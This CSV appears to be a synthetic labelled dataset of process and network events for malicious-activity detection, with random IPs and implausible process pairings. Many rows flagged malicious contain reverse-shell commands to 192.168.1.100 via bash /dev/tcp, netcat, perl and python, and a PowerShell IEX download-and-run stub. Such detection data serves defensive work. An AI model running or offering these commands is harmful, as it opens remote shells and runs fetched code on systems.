timestamp,process_id,parent_process,child_process,source_ip,destination_ip,destination_port,protocol,bytes_sent,bytes_received,duration,command_executed,is_malicious
2025-03-17 01:23:46.088359,d279a9fe,init,cmd.exe,44.215.85.224,2.208.39.210,443,TCP,4284,3478,35.34,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-02 05:13:45.364504,702aebf5,svchost.exe,notepad.exe,145.73.220.81,76.226.48.146,3389,UDP,2921,4313,24.02,cd,0
2025-04-21 08:20:45.678285,cde64bce,explorer.exe,notepad.exe,19.174.204.12,219.110.142.254,443,TCP,4108,2738,0.15,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-17 16:24:45.318758,33f6b6e8,init,cmd.exe,183.187.8.193,227.135.244.227,1337,TCP,3621,4461,58.99,ls,0
2025-04-29 19:29:45.955409,bb8daff7,systemd,python.exe,236.30.250.60,93.175.203.155,8080,TCP,4342,3720,39.03,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-06 23:30:45.096903,cc3e4876,svchost.exe,python.exe,182.160.141.150,250.137.192.188,1337,TCP,524,4535,21.43,ls,0
2025-03-10 01:39:46.074317,f0ac3da1,svchost.exe,nc,172.112.76.43,42.141.29.100,4444,TCP,775,4864,38.73,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-18 15:52:44.877704,8bcdfe28,explorer.exe,powershell,77.49.193.243,89.13.125.72,4444,TCP,4967,1789,44.28,ls,0
2025-03-22 06:43:46.352586,380ae974,systemd,perl,18.180.22.236,216.123.190.236,3389,UDP,1367,4851,16.81,nc -e /bin/sh 192.168.1.100 4444,1
2025-05-01 05:29:44.789890,49d3303f,systemd,bash,95.157.203.89,35.227.15.20,4444,TCP,1059,4358,38.39,ipconfig,0
2025-04-20 15:09:46.374309,50edfb98,systemd,cmd.exe,161.41.161.254,21.175.202.249,4444,UDP,2814,2559,54.09,"python -c 'import socket,subprocess'",1
2025-02-27 11:32:45.677618,f5ffbbb1,systemd,cmd.exe,204.160.69.187,160.120.107.54,443,TCP,243,1073,44.82,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-10 21:52:45.711757,fc6509a2,init,svchost.exe,187.127.55.124,37.94.21.69,22,UDP,297,3578,50.1,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-16 01:23:46.242596,14e96a63,explorer.exe,bash,73.231.198.240,225.7.42.228,1337,TCP,3488,2095,26.97,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-17 17:21:44.898732,e3af8103,svchost.exe,nc,41.116.64.63,40.225.105.33,8080,UDP,3568,3646,17.56,ipconfig,0
2025-03-21 19:06:45.946201,249174e3,systemd,chrome.exe,81.1.197.129,133.23.185.42,22,UDP,3468,3809,59.63,"python -c 'import socket,subprocess'",1
2025-04-11 23:39:45.165990,1d31e4a0,svchost.exe,powershell,77.1.187.104,205.151.116.42,443,UDP,3838,1581,14.8,dir,0
2025-04-15 17:27:45.843990,8400c43c,init,explorer.exe,74.115.42.76,146.90.150.134,8080,TCP,3266,4291,29.46,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-27 11:10:45.484068,8348aaab,svchost.exe,nc,208.131.38.58,76.119.108.220,443,TCP,2152,734,7.95,ls,0
2025-04-23 09:30:45.481853,bb648d5c,explorer.exe,nc,109.117.187.84,186.75.247.83,1337,TCP,778,4701,24.82,cd,0
2025-04-14 19:37:45.924696,054a2f88,init,explorer.exe,101.49.59.115,42.196.179.122,443,UDP,4586,3159,51.75,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-31 16:02:46.403216,647562c0,explorer.exe,cmd.exe,41.212.205.3,75.166.73.229,1337,TCP,1029,2657,25.97,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-15 19:05:46.411225,96ce88a1,systemd,nc,207.149.55.90,118.223.166.155,3389,TCP,649,3334,51.33,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-11 04:15:45.277623,c31db79d,explorer.exe,cmd.exe,22.44.173.215,246.132.190.75,8080,TCP,63,3521,8.79,ping,0
2025-04-16 01:52:46.403065,63adc802,init,nc,24.239.34.108,35.93.19.39,443,UDP,3112,4792,24.97,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-03 05:51:46.315346,ff5126bd,svchost.exe,chrome.exe,178.111.83.64,228.142.209.221,22,TCP,3018,3098,23.75,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-15 14:52:45.816542,728014f9,systemd,svchost.exe,190.210.156.216,141.201.5.23,443,TCP,3479,4331,59.05,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-15 19:55:45.266205,6da04f4b,systemd,nc,170.42.72.67,231.152.32.21,3389,TCP,3159,1421,48.6,dir,0
2025-03-22 22:05:46.253487,815e5062,svchost.exe,python.exe,29.119.108.213,178.249.105.251,3389,UDP,2445,4008,47.17,"python -c 'import socket,subprocess'",1
2025-03-13 10:55:46.367787,7488f492,init,notepad.exe,9.133.93.173,57.160.125.174,22,UDP,4583,4396,16.8,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-16 03:11:45.449310,c3e80786,explorer.exe,bash,245.253.186.115,236.185.23.33,3389,UDP,2991,1336,47.19,ping,0
2025-03-09 04:11:45.368842,429199cc,systemd,svchost.exe,250.241.54.20,119.162.213.246,4444,TCP,409,977,26.27,ls,0
2025-03-12 15:22:45.646518,1b266934,svchost.exe,nc,206.27.193.51,95.253.33.107,22,UDP,1727,4532,42.21,ping,0
2025-03-05 23:34:46.206954,406c0850,init,nc,228.97.215.104,62.33.172.115,3389,TCP,3561,124,39.6,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-26 08:13:45.741896,ff48f807,systemd,chrome.exe,222.133.48.203,137.23.228.67,4444,TCP,1823,4495,10.37,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-10 13:44:45.565088,4165b4bc,init,explorer.exe,174.247.50.248,234.89.167.174,3389,UDP,558,2716,33.19,ls,0
2025-03-28 16:21:46.273255,8fac0fde,systemd,python.exe,114.220.224.43,247.207.247.222,8080,TCP,1459,951,2.91,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-03 12:16:44.890656,096da5e6,systemd,python.exe,171.89.17.94,23.124.205.195,3389,UDP,3025,668,51.97,ls,0
2025-03-13 06:15:45.240497,290c0742,systemd,perl,209.22.139.237,170.210.216.119,443,TCP,2709,636,16.23,ping,0
2025-03-30 16:43:46.150361,5a1970a6,init,powershell,122.72.155.54,107.243.113.240,4444,TCP,2586,935,52.15,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-12 17:52:45.120640,bc32aa0c,init,powershell,143.151.101.99,117.230.203.39,8080,TCP,4277,2720,48.65,ipconfig,0
2025-02-23 20:04:46.249095,f7693251,svchost.exe,svchost.exe,125.94.209.36,198.48.154.84,1337,TCP,3377,3999,27.75,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-29 22:08:45.403710,f3e0fe2a,init,python.exe,71.102.240.51,187.227.140.172,22,TCP,3833,1664,39.67,ls,0
2025-04-21 22:25:44.870300,9af81ff9,explorer.exe,bash,166.168.198.189,154.233.103.79,8080,TCP,4071,3733,12.22,ping,0
2025-04-19 22:57:45.678074,6d5d130d,svchost.exe,explorer.exe,45.30.194.38,126.120.156.165,22,TCP,750,2548,1.84,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-17 17:13:45.882788,1ccfdc51,init,nc,15.131.164.87,117.237.34.60,22,TCP,2925,3547,20.27,"python -c 'import socket,subprocess'",1
2025-04-25 10:27:45.979625,0570bc4e,init,bash,190.16.242.173,234.202.251.144,4444,UDP,2326,757,15.18,"python -c 'import socket,subprocess'",1
2025-04-08 23:31:44.759992,164f0481,init,cmd.exe,32.137.29.176,141.105.17.85,1337,TCP,3022,2782,46.71,ls,0
2025-03-06 07:04:45.396423,984000a3,systemd,python.exe,224.230.209.137,214.88.54.136,22,UDP,847,1501,43.84,cd,0
2025-03-06 06:48:45.584700,8998d336,systemd,nc,4.110.52.164,196.51.2.213,8080,TCP,4530,889,25.6,cd,0
2025-04-14 07:06:45.396307,ab2a5c90,svchost.exe,python.exe,236.114.156.196,160.229.10.234,1337,TCP,3400,291,19.61,dir,0
2025-04-10 15:05:46.026555,41d8ad3a,explorer.exe,nc,179.71.47.188,26.215.3.137,4444,TCP,4002,1028,51.89,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-25 10:51:45.710236,60407d27,init,bash,45.224.43.149,98.240.35.101,4444,TCP,2353,103,58.78,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-18 01:43:46.190002,9d4a1c5d,explorer.exe,bash,224.179.4.38,170.230.49.232,22,UDP,1436,1163,34.55,"python -c 'import socket,subprocess'",1
2025-02-24 20:10:45.553353,f3d26b50,init,bash,232.72.221.109,194.190.3.83,3389,UDP,864,1840,31.82,dir,0
2025-04-01 05:20:45.584891,81602522,explorer.exe,bash,145.215.20.86,206.121.174.96,8080,UDP,1251,3817,10.62,dir,0
2025-04-29 14:28:46.191763,0846bfc9,explorer.exe,cmd.exe,181.155.236.10,152.191.14.226,4444,TCP,3496,4786,50.75,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-02 08:32:46.123047,47154038,init,explorer.exe,162.123.31.93,216.111.223.18,1337,TCP,1308,274,33.37,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-18 11:08:45.481243,66abae05,init,powershell,184.101.71.24,45.209.217.242,443,TCP,4342,3506,20.23,ls,0
2025-04-23 18:34:45.406000,fc41b26b,systemd,notepad.exe,238.31.68.78,170.58.170.109,8080,TCP,3562,1851,37.79,cd,0
2025-03-24 21:58:44.939341,e0fc5ceb,systemd,explorer.exe,156.147.188.119,181.39.134.86,4444,UDP,1044,3709,34.87,ipconfig,0
2025-04-04 23:44:44.805123,ddafd4b7,init,notepad.exe,154.39.91.27,151.249.159.159,4444,UDP,1509,4950,19.17,dir,0
2025-04-26 02:19:45.444963,5a3d4ed8,explorer.exe,chrome.exe,147.38.240.210,249.234.129.96,22,UDP,2361,3692,9.81,dir,0
2025-04-17 23:33:45.674472,c198ad7d,svchost.exe,chrome.exe,194.65.86.72,47.166.108.93,22,UDP,3469,4433,55.75,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-12 23:52:44.792059,0ac46efd,svchost.exe,nc,100.123.51.139,197.249.169.48,22,UDP,2301,3166,46.84,ipconfig,0
2025-04-24 06:28:44.963025,dc644df9,svchost.exe,notepad.exe,100.245.114.172,248.122.227.18,8080,UDP,2657,1567,35.9,ipconfig,0
2025-03-12 10:19:45.822366,a1c8081d,init,explorer.exe,4.246.171.168,115.26.157.6,22,UDP,2418,1109,52.35,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-24 20:27:46.262804,b6db1800,systemd,bash,154.75.195.46,68.212.203.100,3389,UDP,4913,4811,14.11,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-28 07:34:45.166203,18b46ec2,svchost.exe,bash,50.48.157.242,185.39.54.114,443,TCP,1732,2912,7.03,ping,0
2025-04-26 21:02:45.785807,31afad9a,explorer.exe,nc,212.163.169.183,194.78.157.146,8080,TCP,473,4870,51.66,"python -c 'import socket,subprocess'",1
2025-02-28 04:19:45.898824,eb9f2a7c,init,nc,218.235.123.241,226.177.57.111,443,TCP,4396,726,51.12,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-04 02:01:46.154366,9bdec4a9,init,cmd.exe,177.166.118.44,113.39.63.170,443,UDP,1885,509,54.71,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-26 18:30:46.139141,8a586b2a,svchost.exe,python.exe,169.196.240.91,59.58.14.223,4444,UDP,1560,4499,32.52,"python -c 'import socket,subprocess'",1
2025-04-19 06:28:45.026002,4a49561e,systemd,nc,30.178.3.104,136.67.105.109,8080,UDP,3469,3049,32.55,dir,0
2025-04-28 00:51:44.907882,8fc36403,svchost.exe,cmd.exe,145.221.218.175,63.121.96.160,22,UDP,2365,3879,53.03,dir,0
2025-03-25 22:52:46.102690,15817465,svchost.exe,svchost.exe,209.42.215.208,68.90.131.143,3389,UDP,3920,2181,58.13,"python -c 'import socket,subprocess'",1
2025-04-21 01:51:45.666538,5a46a18c,explorer.exe,svchost.exe,17.65.134.223,24.55.12.252,8080,UDP,3731,4142,12.57,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-24 22:18:45.927450,8207c9d8,explorer.exe,chrome.exe,129.253.207.94,208.138.226.20,8080,TCP,3859,1253,4.4,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-09 16:32:45.553785,d2d08d0c,systemd,chrome.exe,81.164.59.84,185.37.56.191,3389,UDP,3918,2587,50.49,ls,0
2025-05-01 08:19:45.697261,eedf2367,svchost.exe,explorer.exe,246.228.154.81,79.140.184.96,8080,TCP,1130,3021,50.62,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-13 06:43:46.115479,657e1f1d,init,chrome.exe,146.251.197.36,62.113.134.128,22,UDP,245,4881,30.88,"python -c 'import socket,subprocess'",1
2025-04-24 12:39:45.266810,f3946d4c,svchost.exe,svchost.exe,224.62.36.239,80.156.221.175,22,UDP,4952,435,29.09,dir,0
2025-02-24 06:34:45.726636,fadb9dc6,svchost.exe,chrome.exe,123.132.88.252,192.64.179.199,1337,UDP,3180,1958,48.36,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-10 03:28:44.921305,57688ce6,explorer.exe,explorer.exe,188.107.73.17,4.55.20.137,4444,TCP,4038,2062,40.14,cd,0
2025-04-01 17:29:45.863756,13aee3cd,explorer.exe,explorer.exe,124.75.21.190,213.59.75.47,443,TCP,312,1752,39.31,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-21 08:39:46.386063,a7c7cd0b,systemd,notepad.exe,205.105.84.102,87.140.121.64,1337,TCP,2431,1177,3.57,"python -c 'import socket,subprocess'",1
2025-02-27 06:31:46.093142,bdc5dad9,explorer.exe,perl,96.191.227.72,125.213.245.190,4444,TCP,4329,959,7.31,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-24 19:33:45.306682,f24c5e0a,explorer.exe,chrome.exe,240.146.32.216,110.121.208.169,443,TCP,2302,2567,48.31,ping,0
2025-03-07 14:09:45.798543,7298a881,systemd,powershell,206.118.100.80,167.242.80.202,4444,TCP,3979,4681,16.02,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-16 10:26:44.790513,32c72bb4,svchost.exe,perl,181.147.160.242,161.108.197.160,3389,UDP,2478,4577,38.54,ipconfig,0
2025-04-02 21:20:46.005764,80551573,svchost.exe,chrome.exe,98.211.84.137,29.91.158.53,1337,TCP,3004,4614,7.33,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-08 00:07:44.782713,f825c310,explorer.exe,powershell,162.213.191.41,218.205.147.36,443,UDP,719,3482,52.86,ipconfig,0
2025-03-31 01:18:44.928526,42cad077,init,python.exe,104.6.146.90,31.69.185.34,8080,UDP,473,1328,4.0,ls,0
2025-04-23 07:53:45.605371,689c6b23,svchost.exe,cmd.exe,36.250.34.153,84.2.232.14,1337,UDP,1434,1197,27.56,ping,0
2025-04-23 00:01:46.103767,8c6387d0,init,cmd.exe,209.62.111.226,230.216.52.214,22,TCP,3410,1763,17.55,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-28 04:38:45.503324,dc3f8455,systemd,explorer.exe,198.229.124.77,254.91.126.194,443,TCP,4959,828,47.79,ls,0
2025-02-28 11:51:45.348886,3c3191cb,systemd,nc,128.73.145.73,156.9.100.136,1337,UDP,4960,1447,45.54,dir,0
2025-04-08 21:03:46.287842,d9702439,explorer.exe,powershell,32.184.226.169,227.188.14.132,22,UDP,1088,2367,4.51,"python -c 'import socket,subprocess'",1
2025-03-30 18:25:44.740532,c8d687cd,svchost.exe,cmd.exe,56.120.78.174,134.212.160.102,3389,TCP,110,4240,59.97,ping,0
2025-03-22 06:44:45.832969,cc22f584,init,notepad.exe,52.21.185.248,209.41.112.200,3389,TCP,3995,2320,25.01,"python -c 'import socket,subprocess'",1
2025-03-09 19:35:45.768705,fa67f66f,explorer.exe,svchost.exe,79.157.208.39,71.50.47.200,443,TCP,1535,2145,53.3,"python -c 'import socket,subprocess'",1
2025-03-18 07:07:45.769019,7422ee6d,explorer.exe,bash,119.105.66.179,22.222.114.186,4444,TCP,3787,4101,41.77,"python -c 'import socket,subprocess'",1
2025-03-31 10:56:45.774174,f76539a1,svchost.exe,python.exe,242.33.171.118,136.9.1.41,1337,UDP,2322,1596,14.13,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-14 20:41:44.899401,855c4a50,init,explorer.exe,145.157.123.165,91.48.223.245,8080,UDP,3477,3115,3.07,ipconfig,0
2025-02-24 20:45:44.735875,522d7781,explorer.exe,explorer.exe,218.217.169.225,78.53.133.156,3389,TCP,3259,2471,38.81,ls,0
2025-02-23 16:08:45.824788,7550b57e,explorer.exe,notepad.exe,82.41.254.220,221.36.249.197,22,TCP,3841,2957,37.66,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-24 20:44:45.803567,3a320a12,systemd,powershell,46.207.219.157,64.50.129.99,8080,UDP,2985,128,11.28,"python -c 'import socket,subprocess'",1
2025-04-03 05:14:44.756413,15e2eb5b,init,svchost.exe,8.123.111.207,7.152.205.161,4444,UDP,2074,933,28.47,ping,0
2025-03-15 12:28:45.946466,c1f07d53,svchost.exe,explorer.exe,137.148.104.57,173.185.10.162,3389,UDP,1046,4755,20.98,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-30 00:21:45.946586,988169de,systemd,chrome.exe,231.205.65.132,94.191.50.15,3389,UDP,2095,441,34.41,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-08 11:16:45.740035,d4cd0231,explorer.exe,perl,206.200.78.5,39.33.211.207,4444,UDP,193,4245,51.05,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-14 01:13:46.265840,59f25488,systemd,python.exe,202.161.12.42,104.176.15.166,1337,TCP,1352,3554,49.06,"python -c 'import socket,subprocess'",1
2025-03-31 18:27:45.664759,81193f48,init,svchost.exe,33.38.81.13,49.179.54.36,8080,TCP,3601,3971,45.91,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-24 13:04:45.562300,36ef4b1b,explorer.exe,cmd.exe,241.18.71.18,85.120.124.3,4444,UDP,3290,408,32.27,ipconfig,0
2025-04-20 19:56:46.059750,251bc48e,svchost.exe,explorer.exe,5.157.143.131,110.77.197.127,443,UDP,2071,1214,28.38,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-26 06:36:46.372713,6a96a7d5,svchost.exe,cmd.exe,137.70.24.126,116.55.214.215,443,TCP,1163,3086,58.16,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-23 13:49:45.382645,b5607a06,init,bash,204.220.118.108,3.110.172.156,22,TCP,2006,1062,52.25,ls,0
2025-04-28 03:22:46.163825,86ac4506,explorer.exe,perl,213.107.8.62,64.139.10.180,3389,UDP,4526,3082,55.04,"python -c 'import socket,subprocess'",1
2025-04-06 02:58:44.775073,350abff8,explorer.exe,python.exe,162.28.171.227,176.246.163.196,1337,UDP,4164,4437,32.0,ls,0
2025-02-26 04:23:45.472074,0d0a478f,init,svchost.exe,68.163.240.152,61.88.13.5,3389,TCP,2914,4079,54.43,ping,0
2025-03-07 18:01:46.316452,e0208b65,systemd,python.exe,32.161.29.8,201.222.69.71,443,UDP,136,318,12.02,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-23 23:54:46.059052,8074bde0,svchost.exe,bash,169.41.65.182,41.75.93.152,22,TCP,675,368,3.86,"python -c 'import socket,subprocess'",1
2025-03-02 03:01:46.354305,194d3ffb,init,powershell,119.117.205.91,13.101.228.3,4444,UDP,2901,4897,37.95,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-02 13:09:46.003301,ee06641b,init,cmd.exe,34.20.110.16,53.150.18.85,4444,UDP,3088,1676,27.42,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-01 23:43:44.812565,890c7c4d,svchost.exe,chrome.exe,99.13.42.145,45.86.67.198,8080,UDP,1258,3743,11.24,ipconfig,0
2025-04-27 23:45:44.826661,14114b4e,systemd,powershell,144.213.226.107,219.107.238.31,8080,TCP,642,4983,2.47,ping,0
2025-03-06 10:11:46.275466,e4ec96cc,systemd,notepad.exe,42.179.157.195,188.168.19.57,3389,TCP,1309,1210,57.75,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-12 20:05:45.730255,f6602551,explorer.exe,cmd.exe,251.65.199.8,157.123.45.60,4444,TCP,1916,1098,19.92,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-28 08:50:46.127298,35f4466d,svchost.exe,svchost.exe,191.196.84.251,196.63.54.205,8080,TCP,1114,584,20.65,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-16 02:51:45.709820,a5f2f461,explorer.exe,chrome.exe,78.88.33.35,246.78.6.177,3389,TCP,1702,4586,2.88,"python -c 'import socket,subprocess'",1
2025-04-17 20:47:45.595046,621d0585,init,nc,252.96.32.89,168.107.56.253,4444,TCP,3032,2006,4.65,ping,0
2025-04-30 02:00:45.253902,1ee90639,svchost.exe,cmd.exe,236.96.32.36,84.142.27.161,4444,UDP,2827,2173,8.93,dir,0
2025-03-21 21:13:46.121834,97bca949,systemd,python.exe,249.48.114.62,160.149.4.111,8080,TCP,3059,3160,56.43,"python -c 'import socket,subprocess'",1
2025-04-03 20:13:44.755130,3b2fd049,svchost.exe,powershell,29.188.16.216,96.67.161.130,4444,TCP,441,1071,26.98,ipconfig,0
2025-03-02 03:07:46.228980,b5f66dd2,svchost.exe,notepad.exe,142.131.59.11,207.247.29.70,4444,TCP,3376,689,2.56,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-24 11:36:44.903695,6766f03e,svchost.exe,explorer.exe,199.243.56.125,147.162.167.55,22,UDP,848,4461,34.88,dir,0
2025-03-20 05:56:45.434020,c3430602,systemd,bash,190.201.134.32,95.147.220.152,3389,UDP,3546,3686,2.4,ping,0
2025-03-22 19:43:45.679447,eba2e026,systemd,python.exe,203.55.238.168,189.120.149.176,443,TCP,4916,2442,37.97,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-10 08:08:45.442458,4b027111,systemd,notepad.exe,188.105.98.199,172.199.214.106,3389,UDP,2874,3235,5.93,dir,0
2025-03-11 04:32:45.417838,e722142e,explorer.exe,svchost.exe,106.68.150.152,9.221.52.96,8080,TCP,4652,4506,16.49,dir,0
2025-03-10 11:01:45.973453,9424c4c4,systemd,cmd.exe,245.116.126.34,139.1.228.148,443,UDP,4940,3386,23.77,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-22 21:33:46.288536,99722dfd,svchost.exe,chrome.exe,228.33.201.136,47.230.41.151,4444,UDP,463,1444,0.55,"python -c 'import socket,subprocess'",1
2025-04-30 07:14:45.470487,1aed0b4c,init,chrome.exe,26.227.99.134,253.162.25.63,443,TCP,4376,2410,12.21,ipconfig,0
2025-03-02 19:28:45.189466,65eff8ec,systemd,svchost.exe,79.79.246.189,103.82.66.73,3389,UDP,4911,324,41.41,ping,0
2025-03-09 00:40:45.271419,447db3bc,explorer.exe,nc,191.245.27.74,98.223.46.203,3389,TCP,637,696,33.14,ipconfig,0
2025-03-09 11:05:45.067881,fe429d34,init,explorer.exe,171.237.220.27,155.150.8.115,1337,TCP,4698,2279,33.7,ipconfig,0
2025-04-20 22:58:45.442405,1cb0c805,explorer.exe,explorer.exe,148.236.126.65,180.28.231.122,8080,TCP,503,2032,50.78,ipconfig,0
2025-03-15 10:46:45.562973,866c30f6,explorer.exe,cmd.exe,78.92.247.237,96.126.58.70,3389,UDP,3267,2074,38.29,dir,0
2025-04-18 09:10:45.413707,b69c6053,explorer.exe,nc,171.158.176.78,215.215.182.51,8080,TCP,3356,2641,21.23,ping,0
2025-04-06 19:23:45.493976,de5cef4e,systemd,svchost.exe,218.243.52.4,229.111.93.222,1337,UDP,81,2170,27.35,ping,0
2025-04-13 08:04:44.780589,0333129f,svchost.exe,bash,100.10.178.173,70.179.97.86,4444,UDP,3385,2852,8.03,ping,0
2025-04-14 21:18:45.384978,ed83c95a,init,perl,103.192.113.198,36.74.188.10,1337,TCP,3078,1248,2.63,cd,0
2025-03-14 19:01:45.324532,86478f39,systemd,nc,17.253.252.31,197.158.225.244,8080,UDP,2413,751,11.42,ls,0
2025-03-10 07:23:45.454175,05ffe866,systemd,bash,236.134.70.199,41.114.132.118,4444,UDP,3531,3474,25.25,cd,0
2025-04-24 07:19:46.168574,c5d0abcf,svchost.exe,powershell,104.128.15.252,21.138.177.188,1337,TCP,3182,4232,36.03,"python -c 'import socket,subprocess'",1
2025-04-23 06:45:44.902692,4113bc59,explorer.exe,cmd.exe,10.208.177.185,186.237.231.163,8080,TCP,4047,4250,38.8,ipconfig,0
2025-03-15 22:11:45.038402,6d860efe,systemd,chrome.exe,38.123.33.174,80.132.83.152,3389,TCP,568,4104,30.89,ping,0
2025-03-03 02:13:45.062314,f87880a0,svchost.exe,powershell,253.215.192.226,142.47.112.235,1337,TCP,2529,1496,49.03,ls,0
2025-04-06 11:53:44.927451,e677f9d0,svchost.exe,nc,205.97.74.15,231.197.138.193,3389,UDP,3804,4801,56.04,ls,0
2025-04-11 16:17:45.735337,431599c2,systemd,bash,136.98.23.252,84.30.132.108,4444,UDP,4070,2790,22.84,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-27 13:06:45.318700,ce50a115,systemd,cmd.exe,189.23.46.17,50.230.79.13,4444,UDP,2225,2484,20.99,ping,0
2025-03-30 03:34:46.043112,b542f22a,explorer.exe,chrome.exe,180.117.35.198,103.179.37.201,8080,TCP,4671,1336,29.8,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-27 16:08:45.412358,0f8b3d27,init,nc,235.79.89.173,138.21.199.150,1337,TCP,1811,1417,48.9,cd,0
2025-03-19 05:54:45.402667,2b766639,explorer.exe,nc,17.68.97.20,138.181.43.173,4444,TCP,4354,191,0.11,ipconfig,0
2025-03-03 00:21:46.344053,3634bc76,systemd,nc,62.233.246.151,226.60.58.146,4444,UDP,1173,3209,3.38,"python -c 'import socket,subprocess'",1
2025-03-08 06:30:46.011882,9dbc2d67,systemd,powershell,199.228.204.8,135.155.189.226,443,UDP,2093,1187,54.77,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-15 19:39:45.143208,75fdd511,systemd,svchost.exe,68.34.251.247,27.26.170.216,443,UDP,2030,2266,53.02,ping,0
2025-04-11 01:20:44.715591,987ca6b1,init,python.exe,6.151.142.59,151.57.2.19,1337,TCP,1925,602,54.33,ping,0
2025-04-19 18:41:46.050094,5ab2bf14,systemd,cmd.exe,155.80.79.139,181.166.27.93,3389,UDP,276,1981,41.31,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-02 03:26:46.151358,e17e4bda,explorer.exe,python.exe,88.118.1.90,166.186.6.77,22,UDP,2822,4314,35.55,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-06 19:42:44.863161,6255e899,systemd,notepad.exe,18.153.204.157,218.123.25.208,22,UDP,1907,1910,49.14,ping,0
2025-04-12 15:03:46.148462,9eecf550,systemd,svchost.exe,243.163.77.21,62.5.78.86,8080,UDP,1622,1906,59.12,nc -e /bin/sh 192.168.1.100 4444,1
